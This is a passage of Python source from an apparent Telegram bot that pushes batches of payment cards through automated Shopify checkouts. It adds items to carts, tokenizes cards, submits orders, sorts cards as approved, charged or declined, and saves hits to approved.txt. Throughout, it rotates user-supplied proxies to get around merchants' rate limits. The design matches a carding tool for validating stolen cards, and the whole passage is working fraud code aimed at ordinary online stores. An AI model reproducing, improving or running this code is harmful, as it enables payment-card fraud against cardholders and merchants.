                            try:
                                with runner._proxy_idx_lock:
                                    runner.product_detection_failures = 0
                            except Exception:
                                pass
                    
                    if is_proxy_issue and runner:
                        try:
                            with runner._proxy_idx_lock:
                                runner.product_detection_failures += 1
                                current_failures = runner.product_detection_failures
                                max_failures = runner.max_detection_failures
                            
                            logger.warning(f"Proxy connection failed for {shop_url} ({current_failures}/{max_failures})")
                            
                            if current_failures >= max_failures:
                                logger.error(f"Failed to connect on {current_failures} consecutive attempts - proxy likely dead")
                                error_msg = f"HTTPSConnectionPool: Failed to connect on {current_failures} consecutive attempts (proxy connection issue)"
                                return "unknown", f'"code": "{error_msg}"', "$0", "", used_proxy_url, None, None
                        except Exception as e:
                            logger.error(f"Error tracking proxy failure: {e}")
                    elif not is_proxy_issue and not is_closed_store:
                        if runner:
                            try:
                                with runner._proxy_idx_lock:
                                    runner.product_detection_failures = 0
                            except Exception:
                                pass
            
            if not variant_id:
                continue
            
            product_price_fallback = price

            _429_retry_count = 0
            _max_429_retries = 3  # Increased from 1 to 3 retries for 429 errors
            while True:
                try:
                    if runner and hasattr(runner, 'cancel_event') and runner.cancel_event.is_set():
                        return ("unknown", '"code": "CANCELLED"', "$0", "", used_proxy_url, None, None)
                except Exception:
                    pass
                
                try:
                    checkout_token, session_token, cookies = checkout.step1_add_to_cart_ctx(session, shop_url, variant_id, _429_retry_count=_429_retry_count)
                except Exception as step1_exc:
                    # Check if it's a 429 error that wasn't caught in step1
                    exc_msg = str(step1_exc).lower()
                    if "429" in exc_msg or "too many requests" in exc_msg:
                        # Log 429 error immediately
                        try:
                            current_proxy = None
                            try:
                                if hasattr(session, 'proxies') and session.proxies:
                                    current_proxy = session.proxies.get('http') or session.proxies.get('https')
                            except:
                                pass
                            if not current_proxy:
                                current_proxy = used_proxy_url
                            if not current_proxy and runner and hasattr(runner, 'proxies_list') and runner.proxies_list:
                                try:
                                    with runner._proxy_idx_lock:
                                        if runner._proxy_idx < len(runner.proxies_list):
                                            current_proxy = runner.proxies_list[runner._proxy_idx]
                                except:
                                    pass
                            
                            user_id = runner.user_id if runner else None
                            if current_proxy:
                                log_proxy_error(current_proxy, "429_Rate_Limit", f"429 error in step1_add_to_cart: {exc_msg[:100]}", user_id, shop_url)
                            else:
                                # Log even if we can't get the proxy
                                log_proxy_error("Unknown proxy", "429_Rate_Limit", f"429 error in step1_add_to_cart: {exc_msg[:100]} - could not determine proxy", user_id, shop_url)
                        except Exception as log_err:
                            # Last resort - try to log with minimal info
                            try:
                                user_id = runner.user_id if runner else None
                                log_proxy_error("Unknown proxy", "429_Rate_Limit", f"429 error in step1_add_to_cart: {str(log_err)[:100]}", user_id, shop_url)
                            except:
                                pass
                        
                        if _429_retry_count < _max_429_retries:
                            checkout_token = "429_ROTATE"
                            session_token = str(_429_retry_count)
                            cookies = None
                        else:
                            checkout_token = None
                            session_token = None
                            cookies = None
                    else:
                        # Re-raise non-429 errors to be handled by outer exception handler
                        raise
                
                if checkout_token == "429_ROTATE":
                    _429_retry_count = int(session_token or "0") + 1
                    
                    # Log 429 error (also log when returned from step1_add_to_cart_ctx)
                    try:
                        # Try multiple ways to get the proxy URL
                        current_proxy = None
                        try:
                            # Try to get from session.proxies
                            if hasattr(session, 'proxies') and session.proxies:
                                current_proxy = session.proxies.get('http') or session.proxies.get('https')
                                if isinstance(current_proxy, dict):
                                    current_proxy = current_proxy.get('http') or current_proxy.get('https')
                        except Exception:
                            pass
                        
                        # Try to get from used_proxy_url variable
                        if not current_proxy and used_proxy_url:
                            current_proxy = used_proxy_url
                        
                        # Try to get from runner's proxy list
                        if not current_proxy and runner and hasattr(runner, 'proxies_list') and runner.proxies_list:
                            try:
                                with runner._proxy_idx_lock:
                                    if runner._proxy_idx < len(runner.proxies_list):
                                        current_proxy = runner.proxies_list[runner._proxy_idx]
                                    elif len(runner.proxies_list) > 0:
                                        # Fallback to first proxy in list
                                        current_proxy = runner.proxies_list[0]
                            except Exception:
                                pass
                        
                        # Try to get from proxies_override if available
                        if not current_proxy and proxies_override and isinstance(proxies_override, dict):
                            current_proxy = proxies_override.get('https') or proxies_override.get('http')
                        
                        # Log the error even if we can't get the exact proxy
                        user_id = runner.user_id if runner else None
                        if current_proxy:
                            log_proxy_error(current_proxy, "429_Rate_Limit", f"429 rate limit (retry {_429_retry_count}/{_max_429_retries})", user_id, shop_url)
                            logger.debug(f"Logged 429 error for proxy: {mask_proxy(current_proxy)}")
                        else:
                            # Log with "Unknown" proxy so the error is still tracked
                            log_proxy_error("Unknown proxy", "429_Rate_Limit", f"429 rate limit (retry {_429_retry_count}/{_max_429_retries}) - could not determine proxy URL", user_id, shop_url)
                            logger.warning(f"Could not determine proxy URL for 429 error logging at site: {shop_url} - logged with 'Unknown proxy'")
                    except Exception as log_err:
                        logger.error(f"Error logging 429 error: {log_err}", exc_info=True)
                        # Try to log with minimal info as fallback
                        try:
                            user_id = runner.user_id if runner else None
                            log_proxy_error("Unknown proxy", "429_Rate_Limit", f"429 rate limit (error in logging: {str(log_err)[:100]})", user_id, shop_url)
                        except:
                            pass
                    
                    if runner and runner.proxies_list:
                        try:
                            current_proxy = session.proxies.get('http') or session.proxies.get('https')
                            if current_proxy and runner.track_429_error(current_proxy):
                                logger.warning(f"Proxy marked as dead due to repeated 429 errors")
                        except Exception as e:
                            logger.error(f"Error tracking 429 error: {e}")
                    
                    if _429_retry_count < _max_429_retries:
                        if runner and runner.proxies_list:
                            try:
                                if len(runner.proxies_list) > 0:
                                    with runner._proxy_idx_lock:
                                        runner._proxy_idx = (runner._proxy_idx + 1) % len(runner.proxies_list)
                                        new_proxy = runner.proxies_list[runner._proxy_idx]
                                        session.proxies.update({"http": new_proxy, "https": new_proxy})
                                        used_proxy_url = new_proxy
                            except Exception:
                                pass
                        continue
                    else:
                        checkout_token = None
                        session_token = None
                        break
                
                if runner and runner.proxies_list:
                    try:
                        current_proxy = session.proxies.get('http') or session.proxies.get('https')
                        if current_proxy:
                            runner.reset_429_counter(current_proxy)
                    except Exception:
                        pass
                break
                
            if not checkout_token or not session_token:
                continue

            card_session_id = checkout.step2_tokenize_card_ctx(session, checkout_token, shop_url, card_data)
            if not card_session_id:
                continue

            queue_token, shipping_handle, merchandise_id, actual_total, delivery_expectations, phone_required = checkout.step3_proposal_ctx(
                session, checkout_token, session_token, card_session_id, shop_url, variant_id
            )
            if not queue_token or not shipping_handle:
                print(f"[DEBUG] Step 4 skipped - Missing queue_token or shipping_handle")
                print(f"[DEBUG] - queue_token: {queue_token[:30] if queue_token else None}")
                print(f"[DEBUG] - shipping_handle: {shipping_handle[:50] if shipping_handle else None}")
                
                # Remove site from working_sites.txt - this is a site-level issue
                missing_field = "queue_token" if not queue_token else "shipping_handle"
                logger.warning(f"Site {shop_url} missing {missing_field} - removing from working_sites.txt")
                
                try:
                    with BOT_PRODUCT_CACHE_LOCK:
                        if shop_url in site_product_cache:
                            del site_product_cache[shop_url]
                except Exception:
                    pass
                
                # DISABLED: Site removal disabled - never remove sites
                # try:
                #     checkout.remove_site_from_working_sites(shop_url)
                #     log_site_removal(shop_url, f"Missing {missing_field}")
                #     logger.info(f"Removed site {shop_url} (missing {missing_field}) from working_sites.txt")
                # except Exception as e:
                #     logger.error(f"Failed to remove site {shop_url}: {e}")
                logger.info(f"Site {shop_url} missing {missing_field} but removal is disabled")
                
                try:
                    normalized_target = checkout.normalize_shop_url(shop_url).rstrip("/")
                    sites[:] = [s for s in sites if checkout.normalize_shop_url(s).rstrip("/") != normalized_target]
                except Exception:
                    pass
                
                continue

            # Check for cancellation before Step 4 (submission - can be slow)
            try:
                if runner and hasattr(runner, 'cancel_event') and runner.cancel_event.is_set():
                    return ("unknown", '"code": "CANCELLED"', "$0", "", used_proxy_url, None, None)
            except Exception:
                pass
            
            print(f"[DEBUG] ========== STEP 4 STARTING ==========")
            print(f"[DEBUG] Calling step4_submit_completion_ctx...")
            print(f"[DEBUG] Input params - shop_url: {shop_url}, variant_id: {variant_id}, phone_required: {phone_required}")
            print(f"[DEBUG] Input params - queue_token: {queue_token[:30] if queue_token else 'None'}...")
            print(f"[DEBUG] Input params - card_session_id: {card_session_id[:30] if card_session_id else 'None'}...")
            print(f"[DEBUG] Input params - actual_total: {actual_total}, delivery_expectations count: {len(delivery_expectations)}")
            
            try:
                receipt_result = checkout.step4_submit_completion_ctx(
                    session, checkout_token, session_token, queue_token,
                    shipping_handle, merchandise_id, card_session_id,
                    actual_total, delivery_expectations, shop_url, variant_id, phone_required
                )
                print(f"[DEBUG] Step 4 completed, result type: {type(receipt_result)}")
            except Exception as e:
                print(f"  [ERROR] Step 4 threw exception: {e}")
                print(f"  [ERROR] Step 4 exception type: {type(e).__name__}")
                print(f"  [ERROR] Step 4 exception args: {e.args}")
                logger.exception("Step 4 exception")
                import traceback
                print(f"  [ERROR] Step 4 traceback:\n{traceback.format_exc()}")
                continue

            def _amount_display():
                try:
                    if actual_total:
                        return checkout.format_amount(actual_total)
                    elif product_price_fallback:
                        return f"~{checkout.format_amount(product_price_fallback)}"
                    else:
                        return "Unknown"
                except Exception:
                    return "$0"

            if isinstance(receipt_result, tuple):
                if len(receipt_result) >= 5:
                    receipt_id, submit_code, submit_message, submit_resp, amount_from_step4 = receipt_result
                    if not actual_total and amount_from_step4:
                        actual_total = amount_from_step4
                elif len(receipt_result) >= 4:
                    receipt_id, submit_code, submit_message, submit_resp = receipt_result
                else:
                    receipt_id, submit_code, submit_message = receipt_result
                    submit_resp = {}
            else:
                receipt_id = receipt_result
                submit_code = "UNKNOWN"
                submit_message = None
                submit_resp = {}

            print(f"[DEBUG] Step 4 result processing:")
            print(f"[DEBUG] - receipt_id: {receipt_id}")
            print(f"[DEBUG] - submit_code: {submit_code}")
            print(f"[DEBUG] - submit_message: {submit_message}")
            print(f"[DEBUG] - submit_resp keys: {list(submit_resp.keys()) if isinstance(submit_resp, dict) else 'N/A'}")
            
            if not receipt_id:
                submit_upper = (str(submit_code) if submit_code is not None else "").upper()
                print(f"[DEBUG] Step 4 - No receipt_id, submit_code: {submit_code}, submit_upper: {submit_upper}")
                
                if "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED" in submit_upper:
                    try:
                        code_display = f'"code": "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED"'
                    except Exception:
                        code_display = '"code": "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED"'
                    status = "declined"
                    return status, code_display, _amount_display(), site_label, used_proxy_url, shop_url, None
                
                site_level_submit_errors = (
                    "MERCHANDISE_OUT_OF_STOCK",
                    "DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE",
                    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT",
                    "REQUIRED_ARTIFACTS_UNAVAILABLE",
                    "CAPTCHA_METADATA_MISSING",
                    "PAYMENTS_METHOD",
                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
                    "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
                    "VALIDATION_CUSTOM",
                    "VALIDATION_",
                    "PAYMENTS_CREDIT_CARD_SESSION_ID",
                    "PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED",
                )
                
                # Check if submit_code indicates a site-level error that requires site removal
                is_site_level_error = any(tok in submit_upper for tok in site_level_submit_errors)
                
                # Also check if receipt_id is None and submit_code indicates site-level submission failure
                # "No receipt_id" means step 4 completed but didn't return a receipt - could be site issue
                # Only remove site if it's a site-level HTTP error (402, 403, 404) or submission rejection, not network errors
                no_receipt_id_site_error = (not receipt_id and 
                                            submit_code and 
                                            submit_code in ("HTTP_402", "HTTP_403", "HTTP_404", "SUBMITREJECTED", "SUBMITFAILED", "THROTTLED"))
                
                # Check if this is a 404 error (site is dead/deleted) - enable removal for 404 only
                is_404_error = (submit_code and submit_code == "HTTP_404")
                
                if is_site_level_error or no_receipt_id_site_error:
                    error_reason = "site-level error" if is_site_level_error else "no receipt_id from step 4"
                    if "PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED" in submit_upper:
                        logger.warning(f"Site {shop_url} hit PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED - removing site and continuing to next site")
                    print(f"[DEBUG] Step 4 - Removing site due to {error_reason}")
                    print(f"[DEBUG] Step 4 - submit_code: {submit_code}, receipt_id: {receipt_id}")
                    
                    # IMPORTANT: For proxy testing (when only 1 site is provided), return the step 4 result
                    # so that /setpr can detect that step 4 was reached, even if it's a site-level error
                    # This allows proxies to be added immediately when they reach step 4
                    total_sites_remaining = len([s for s in sites if checkout.normalize_shop_url(s).rstrip("/") != checkout.normalize_shop_url(shop_url).rstrip("/")]) if isinstance(sites, list) else 0
                    is_proxy_test = (isinstance(sites, list) and len(sites) == 1) or total_sites_remaining == 0
                    
                    if is_proxy_test:
                        # For proxy testing: return step 4 result immediately so /setpr can detect it
                        # Create code_display with submit_code so step 4 detection works
                        try:
                            code_display = f'"code": "{str(submit_code)}"' if isinstance(submit_code, str) and submit_code else '"code": "SUBMIT_ACCEPTED"'
                        except Exception:
                            code_display = '"code": "SUBMIT_ACCEPTED"'
                        # Return with "unknown" status but with submit_code in code_display so step 4 can be detected
                        print(f"[DEBUG] Step 4 - Proxy test mode: Returning step 4 result (submit_code: {submit_code})")
                        return "unknown", code_display, _amount_display(), site_label, used_proxy_url, shop_url, None
                    
                    # For normal card checking: continue to next site
                    try:
                        with BOT_PRODUCT_CACHE_LOCK:
                            if shop_url in site_product_cache:
                                del site_product_cache[shop_url]
                    except Exception:
                        pass
                    
                    # ENABLED: Site removal for 404 errors only (site is dead/deleted)
                    if is_404_error:
                        try:
                            checkout.remove_site_from_working_sites(shop_url)
                            reason = f"HTTP 404 - Site not found (deleted/closed)"
                            log_site_removal(shop_url, reason)
                            logger.info(f"Removed site {shop_url} from working_sites.txt due to 404 error")
                            print(f"[DEBUG] Step 4 - Site {shop_url} removed from working_sites.txt (404 error)")
                        except Exception as e:
                            logger.error(f"Failed to remove site {shop_url} due to 404: {e}")
                            print(f"[DEBUG] Step 4 - Failed to remove site: {e}")
                    else:
                        # For other errors, removal is disabled
                        print(f"[DEBUG] Step 4 - Site {shop_url} would be removed due to {error_reason} but removal is disabled")
                    
                    # Track site health - mark as CAPTCHA or error
                    try:
                        if "CAPTCHA" in submit_upper:
                            update_site_health(shop_url, "captcha")
                        else:
                            update_site_health(shop_url, "error")
                    except Exception as track_err:
                        logger.debug(f"Failed to track site health: {track_err}")
                    
                    try:
                        normalized_target = checkout.normalize_shop_url(shop_url).rstrip("/")
                        sites[:] = [s for s in sites if checkout.normalize_shop_url(s).rstrip("/") != normalized_target]
                        print(f"[DEBUG] Step 4 - Site removed from current sites list")
                    except Exception as e:
                        print(f"[DEBUG] Step 4 - Failed to remove site from list: {e}")
                    print(f"[DEBUG] Step 4 - Continuing to next site for same card")
                    continue
                try:
                    code_display = f'"code": "{str(submit_code)}"' if isinstance(submit_code, str) and submit_code else '"code": "UNKNOWN"'
                except Exception:
                    code_display = '"code": "UNKNOWN"'
                status = classify_prefix(code_display)
                if status == "unknown":
                    continue
                return status, code_display, _amount_display(), site_label, used_proxy_url, shop_url, None
            
            if isinstance(receipt_id, str) and not receipt_id.startswith("gid://shopify/"):
                try:
                    code_display = f'"code": "{str(submit_code)}"' if isinstance(submit_code, str) and submit_code else '"code": "SUBMIT_ACCEPTED"'
                except Exception:
                    code_display = '"code": "SUBMIT_ACCEPTED"'
                status = classify_prefix(code_display)
                return status, code_display, _amount_display(), site_label, used_proxy_url, shop_url, receipt_id

            # Check for cancellation before Step 5 (polling - can be slow)
            try:
                if runner and hasattr(runner, 'cancel_event') and runner.cancel_event.is_set():
                    return ("unknown", '"code": "CANCELLED"', "$0", "", used_proxy_url, None, None)
            except Exception:
                pass

            success, poll_response, poll_log = checkout.step5_poll_receipt_ctx(
                session, checkout_token, session_token, receipt_id, shop_url, capture_log=False
            )
            try:
                code_display = checkout.extract_receipt_code(poll_response)
            except Exception:
                code_display = '"code": "UNKNOWN"'
            status = classify_prefix(code_display)
            if status == "unknown":
                try:
                    receipt = (poll_response or {}).get("data", {}).get("receipt", {}) if isinstance(poll_response, dict) else {}
                    if isinstance(receipt, dict) and receipt.get("__typename") == "FailedReceipt":
                        perr = receipt.get("processingError", {}) or {}
                        ptyp = perr.get("__typename", "")
                        if ptyp in ("InventoryReservationFailure", "InventoryClaimFailure", "OrderCreationFailure"):
                            try:
                                with BOT_PRODUCT_CACHE_LOCK:
                                    if shop_url in site_product_cache:
                                        del site_product_cache[shop_url]
                            except Exception:
                                pass
                            continue
                except Exception:
                    pass
                continue
            try:
                code_upper = (code_display or "").upper()
                if "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED" in code_upper:
                    status = "declined"
                    return status, code_display, _amount_display(), site_label, used_proxy_url, shop_url, receipt_id
            except Exception:
                pass
            
            try:
                code_upper = (code_display or "").upper()
                site_level_receipt_errors = (
                    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT",
                    "PAYMENTS_METHOD",
                    "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
                    "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
                    "VALIDATION_CUSTOM",
                    "VALIDATION_",
                    "PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED",
                )
                if any(tok in code_upper for tok in site_level_receipt_errors):
                    if "PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED" in code_upper:
                        logger.warning(f"Site {shop_url} hit PAYMENTS_NON_TEST_ORDER_LIMIT_REACHED in receipt - removing site and continuing to next site")
                    try:
                        with BOT_PRODUCT_CACHE_LOCK:
                            if shop_url in site_product_cache:
                                del site_product_cache[shop_url]
                    except Exception:
                        pass
                    # DISABLED: Site removal disabled - never remove sites
                    # try:
                    #     checkout.remove_site_from_working_sites(shop_url)
                    #     reason = code_display if code_display else "Unknown receipt error"
                    #     log_site_removal(shop_url, reason)
                    # except Exception:
                    #     pass
                    logger.info(f"Site {shop_url} would be removed due to receipt error but removal is disabled")
                    try:
                        normalized_target = checkout.normalize_shop_url(shop_url).rstrip("/")
                        sites[:] = [s for s in sites if checkout.normalize_shop_url(s).rstrip("/") != normalized_target]
                    except Exception:
                        pass
                    continue
            except Exception:
                pass
            
            # Track site health - mark as success if card was processed
            try:
                if status in ("approved", "declined", "charged"):
                    update_site_health(shop_url, "success")
                elif status == "unknown":
                    update_site_health(shop_url, "error")
                else:
                    # For other statuses, still count as success (card was checked)
                    update_site_health(shop_url, "success")
            except Exception as track_err:
                logger.debug(f"Failed to track site health: {track_err}")
            
            return status, code_display, _amount_display(), site_label, used_proxy_url, shop_url, receipt_id

        except Exception as e:
            try:
                last_exception_msg = str(e)
            except Exception:
                last_exception_msg = repr(e)
            
            # Check if it's a 429 rate limit error - these are common and expected, reduce logging
            error_msg_lower = last_exception_msg.lower()
            is_429_error = "429" in error_msg_lower or "too many requests" in error_msg_lower
            
            if is_429_error:
                # Log at debug level instead of warning to reduce noise
                print(f"  [DEBUG] Site attempt skipped due to 429 rate limit (proxy rotation will retry)")
            else:
                # Only log warnings for non-429 errors
                logger.warning(f"Site attempt failed due to exception: {e}")
            
            try:
                err_lower = last_exception_msg.lower()
                
                if "tunnel connection failed: 429" in err_lower or "proxy" in err_lower and "429" in err_lower:
                    # 429 rate limits are common - use debug level instead of warning
                    print(f"  [DEBUG] Proxy rate limited (429), trying next site...")
                    # Log 429 error
                    if used_proxy_url:
                        log_proxy_error(used_proxy_url, "429_Rate_Limit", "Proxy rate limited (429)", None, shop_url)
                    continue
                
                critical_proxy_errors = [
                    "httpsconnectionpool",
                    "httpconnectionpool",
                    "connectionpool",
                    "proxyerror",
                    "unable to connect to proxy",
                    "tunnel connection failed",
                    "connection timed out",
                    "max retries exceeded",
                    "connect timeout",
                ]
                is_critical = any(sig in err_lower for sig in critical_proxy_errors)
                
                if is_critical:
                    logger.error(f"Critical proxy error detected: {last_exception_msg}")
                    # Log critical proxy error
                    if used_proxy_url:
                        error_type = "Connection_Failed"
                        if "timeout" in err_lower:
                            error_type = "Connection_Timeout"
                        elif "proxyerror" in err_lower:
                            error_type = "Proxy_Error"
                        log_proxy_error(used_proxy_url, error_type, last_exception_msg[:200], None, shop_url)
                    single = " ".join(str(last_exception_msg).splitlines())
                    code_msg = f'"code": "{single}"'
                    return "unknown", code_msg, "$0", "", used_proxy_url, None, None
            except Exception:
                pass
            
            continue

    if last_exception_msg:
        single = " ".join(str(last_exception_msg).splitlines())
        code_msg = f'"code": "{single}"'
    else:
        code_msg = '"code": "UNKNOWN"'
    return "unknown", code_msg, "$0", "", used_proxy_url, None, None

class BatchRunner:
    def __init__(self, cards: List[Dict], sites: List[str], executor: ThreadPoolExecutor, batch_id: str, chat_id: int, user_id: int, cancel_event: asyncio.Event, send_approved_notifications: bool = True, proxies_override: Optional[Dict[str, str]] = None, start_from: int = 0, total_override: Optional[int] = None):
        self.cards = cards
        self.sites = sites  # Use sites as-is, optimization done by caller if needed
        self.executor = executor
        # If total_override is provided (e.g., when resuming), use it instead of len(cards)
        # This fixes the bug where resumed batches show wrong total (e.g., 273/127 instead of 273/400)
        self.total = total_override if total_override is not None else len(cards)
        self.processed = start_from
        self.approved = 0
        self.declined = 0
        self.charged = 0
        self.start_ts = time.time()
        self.lock = asyncio.Lock()
        self.batch_id = batch_id
        self.chat_id = chat_id
        self.user_id = user_id
        self.cancel_event = cancel_event
        self.send_approved_notifications = bool(send_approved_notifications)
        self.proxies_mapping: Optional[Dict[str, str]] = None
        self.proxies_list: Optional[List[str]] = None
        if isinstance(proxies_override, list):
            try:
                self.proxies_list = [str(p).strip() for p in proxies_override if str(p).strip()]
            except Exception:
                self.proxies_list = None
        elif isinstance(proxies_override, dict):
            self.proxies_mapping = proxies_override
        else:
            self.proxies_mapping = None
        self._proxy_idx_lock = threading.Lock()
        self._proxy_idx = 0
        self.per_proxy_unknown: Dict[str, int] = {}
        self.unknown_streak = 0
        self.proxy_dead_notified = False
        self.unknown_retry_max = 3  # Reduced from 6 to fail faster and move on
        self.unknown_retry_delay = 1.0  # Reduced from 5.0 to 1.0 seconds for faster retries
        self.consecutive_429_errors: Dict[str, int] = {}
        self.dead_proxy_threshold = 25  # Increased to 25 to allow more 429 errors before removing proxy
        self.proxy_removed = False
        self.product_detection_failures = 0
        self.max_detection_failures = 3
        self.last_progress_update = 0.0
        # Dynamic progress update interval based on batch size (larger batches = less frequent updates)
        if self.total < 100:
            self.progress_update_interval = 0.5  # Small batches: update every 0.5s
        elif self.total < 1000:
            self.progress_update_interval = 1.0  # Medium batches: update every 1s
        elif self.total < 10000:
            self.progress_update_interval = 2.0  # Large batches: update every 2s
        else:
            self.progress_update_interval = 5.0  # Very large batches: update every 5s to reduce API overhead
        self.paused_for_proxies = False
        self._pending_save_lock = asyncio.Lock()  # Lock to prevent duplicate pending saves

    async def _save_to_pending_immediately(self, title: str = "Batch"):
        """Save batch to pending immediately when paused for proxies"""
        try:
            async with self._pending_save_lock:
                # Check if already saved (avoid duplicate saves)
                pending_data = await list_pending()
                if str(self.batch_id) in pending_data:
                    existing = pending_data[str(self.batch_id)]
                    if existing.get("processed", 0) == self.processed:
                        return  # Already saved with same progress
                
                await add_pending(self.batch_id, {
                    "batch_id": self.batch_id,
                    "user_id": self.user_id,
                    "chat_id": self.chat_id,
                    "title": title,
                    "cards": self.cards,
                    "sites": self.sites,
                    "send_approved_notifications": self.send_approved_notifications,
                    "processed": self.processed
                })
                logger.info(f"Batch {self.batch_id} paused for proxies - saved to pending immediately with {self.processed}/{self.total} processed")
        except Exception as e:
            logger.error(f"Failed to save batch to pending immediately: {e}")

    def stop_keyboard(self):
        try:
            if self.cancel_event and not self.cancel_event.is_set():
                return InlineKeyboardMarkup(
                    [[InlineKeyboardButton("⏹ Stop", callback_data=f"STOP:{self.batch_id}")]]
                )
        except Exception:
            pass
        return None
    
    def track_429_error(self, proxy_url: str) -> bool:
        """
        Track 429 error for a proxy. Returns True if proxy should be removed (dead).
        """
        if not proxy_url or not self.proxies_list:
            return False
            
        try:
            with self._proxy_idx_lock:
                self.consecutive_429_errors[proxy_url] = self.consecutive_429_errors.get(proxy_url, 0) + 1
                count = self.consecutive_429_errors[proxy_url]
                
                # Log the 429 error
                log_proxy_error(proxy_url, "429_Rate_Limit", f"{count} consecutive 429 errors", self.user_id)
                
                if count >= self.dead_proxy_threshold:
                    logger.warning(f"Proxy {proxy_url} hit {count} consecutive 429 errors - marking as dead")
                    return True
                return False
        except Exception as e:
            logger.error(f"Error tracking 429 error: {e}")
            return False
    
    
    def reset_429_counter(self, proxy_url: str):
        """Reset 429 error counter for a proxy after a successful request."""
        if proxy_url:
            with self._proxy_idx_lock:
                if proxy_url in self.consecutive_429_errors:
                    self.consecutive_429_errors[proxy_url] = 0
    
    async def remove_dead_proxy(self, proxy_url: str, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Remove a dead proxy from the user's proxy list and notify them."""
        if not proxy_url or not self.proxies_list or self.proxy_removed:
            return
        
        try:
            if proxy_url in self.proxies_list:
                self.proxies_list.remove(proxy_url)
                logger.info(f"Removed dead proxy: {proxy_url}")
                self.proxy_removed = True
                
                try:
                    await remove_user_proxy(self.user_id, proxy_url, "Dead proxy - connection failed")
                except Exception as e:
                    logger.error(f"Failed to remove proxy from storage: {e}")
                
                masked_proxy = mask_proxy_password(proxy_url)
                try:
                    display_name, username = await get_user_info_for_proxy(self.user_id)
                    user_display = f'<a href="tg://user?id={self.user_id}">{username if username else display_name}</a>'
                except Exception:
                    user_display = f'<a href="tg://user?id={self.user_id}">{self.user_id}</a>'
                
                await update.effective_chat.send_message(
                    f"⚠️ <b>Proxy Dead - Removed</b>\n\n"
                    f"Proxy: <code>{masked_proxy}</code>\n\n"
                    f"User: {user_display}\n\n"
                    f"Reason: {self.dead_proxy_threshold} consecutive 429 errors\n\n"
                    f"<b>Please add a new proxy with /setpr</b>",
                    parse_mode=ParseMode.HTML
                )
                
                if len(self.proxies_list) == 0:
                    self.proxies_list = None
                    self.proxies_mapping = None
                    # Set paused flag and cancel event IMMEDIATELY
                    self.paused_for_proxies = True
                    self.cancel_event.set()
                    # Update ACTIVE_BATCHES to reflect pause status
                    try:
                        async with ACTIVE_LOCK:
                            rec = ACTIVE_BATCHES.get(self.batch_id)
                            if rec is not None:
                                rec["paused_for_proxies"] = True
                                ACTIVE_BATCHES[self.batch_id] = rec
                    except Exception:
                        pass
                    try:
                        await update.effective_chat.send_message(
                            "⚠️ <b>All Proxies Dead - Check Paused</b>\n\n"
                            "All your proxies have failed.\n\n"
                            "<b>Add new proxies with /setpr to resume your check.</b>\n\n"
                            "Your progress has been saved.",
                            parse_mode=ParseMode.HTML
                        )
                    except Exception:
                        pass
                    
        except Exception as e:
            logger.error(f"Error removing dead proxy: {e}")

    async def run(self, update: Update, context: ContextTypes.DEFAULT_TYPE, title: str):
        progress_msg = await update.effective_chat.send_message(
            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=self.stop_keyboard(),
        )

        futures = []
        for card in self.cards:
            futures.append(self.executor.submit(check_single_card, card, self.sites, None, self))

        for fut in as_completed(futures):
            result = fut.result()
            if len(result) == 7:
                status, code_display, amount_display, site_label, used_proxy_url, site_url, receipt_id = result
            elif len(result) == 6:
                status, code_display, amount_display, site_label, used_proxy_url, site_url = result
                receipt_id = None
            elif len(result) == 5:
                status, code_display, amount_display, site_label, used_proxy_url = result
                site_url = None
                receipt_id = None
            elif len(result) == 4:
                status, code_display, amount_display, site_label = result
                used_proxy_url = None
                site_url = None
                receipt_id = None
            else:
                status, code_display, amount_display, site_label = "unknown", '"code": "UNKNOWN"', "$0", ""
                used_proxy_url = None
                site_url = None
                receipt_id = None
            
            async with self.lock:
                if status == "charged":
                    self.charged += 1
                    self.processed += 1
                elif status == "approved":
                    self.approved += 1
                    self.processed += 1
                elif status == "declined":
                    self.declined += 1
                    self.processed += 1
                else:
                    pass
                current_time = time.time()
                if current_time - self.last_progress_update >= self.progress_update_interval:
                    try:
                        await context.bot.edit_message_text(
                            chat_id=progress_msg.chat_id,
                            message_id=progress_msg.message_id,
                            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True,
                        )
                        self.last_progress_update = current_time
                    except Exception:
                        pass

            logger.info(f"[DEBUG] Card result - status: {status}, code: {code_display}")
            if status in ("approved", "charged"):
                logger.info(f"[DEBUG] Entering approved/charged block for {status}")
                display_name = None
                user_id = None
                try:
                    user = update.effective_user
                    user_id = user.id
                    display_name = (user.full_name or "").strip()
                    if not display_name:
                        uname = (user.username or "").strip()
                        display_name = uname if uname else str(user.id)
                except Exception:
                    pass
                
                logger.info(f"[DEBUG] About to persist to approved.txt - status: {status}")
                try:
                    with APPROVED_FILE_LOCK:
                        site_display_val = site_label
                        if isinstance(display_name, str) and display_name.strip():
                            site_display_val = f"{site_label} |  {display_name.strip()}"
                        logger.info(f"[DEBUG] Writing to approved.txt: {site_display_val}")
                        try:
                            checkout.emit_summary_line(card, code_display, amount_display, site_display=site_display_val)
                        except TypeError:
                            checkout.emit_summary_line(card, code_display, amount_display)
                except Exception:
                    pass
                
                send_chat = (status == "charged") or (status == "approved" and self.send_approved_notifications)
                logger.info(f"[DEBUG] send_chat = {send_chat}, send_approved_notifications = {self.send_approved_notifications}")
                if send_chat:
                    try:
                        notify_text = result_notify_text(card, status, code_display, amount_display, site_label, display_name, receipt_id, user_id)
                        logger.info(f"Sending {status} notification for card ending in {card.get('number', '')[-4:]}")
                        await update.effective_chat.send_message(
